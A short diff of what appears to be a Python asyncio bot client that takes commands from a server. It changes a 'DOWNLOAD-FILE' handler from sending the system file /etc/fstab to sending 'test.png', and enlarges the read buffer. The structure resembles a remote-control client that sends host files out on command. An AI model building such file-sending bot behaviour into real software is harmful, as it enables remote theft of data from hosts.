@@ -47,7 +47,7 @@ async def command_to_execute(writer: asyncio.StreamWriter, case: str) -> None:
                 writer.write(user_data.encode())
                 await asyncio.sleep(1)
         case 'DOWNLOAD-FILE':
-            await bot_utils.send_file("/etc/fstab", writer)  # TODO: Generalizza file
+            await bot_utils.send_file("test.png", 8192, writer)  # TODO: Generalizza file
         case _:
             return "NULL"
 
@@ -61,7 +61,7 @@ async def run() -> None:
     writer.write(operation_keyword.encode())
     await writer.drain()
     while True:
-        response = await reader.read(1024)
+        response = await reader.read(8192)
         if not response:
             raise Exception("Socket closed!")
         print(f"Received from server: {response.decode()!r}")
